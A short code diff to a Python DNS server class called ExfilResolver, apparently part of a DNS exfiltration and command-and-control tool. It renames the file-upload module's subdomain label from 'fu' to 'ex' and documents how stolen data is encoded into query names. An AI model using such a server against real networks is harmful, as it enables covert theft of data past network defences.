@@ -29,7 +29,7 @@ class ExfilResolver(BaseResolver):
             reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
             return reply
             
-        if module == "fu":
+        if module == "ex":
             return self.fileupload(request, qname)
 
         if module == "c2":
@@ -48,7 +48,7 @@ class ExfilResolver(BaseResolver):
         reply.header.rcode = RCODE.NXDOMAIN
         return reply
     # DNS requests for this module look like this: 
-    # [data].[index].[file id].fu.[origin]
+    # [data].[index].[file id].ex.[origin]
     # OR 
     # start-[lines].000.[file id].origin
     def fileupload(self, request, qname):
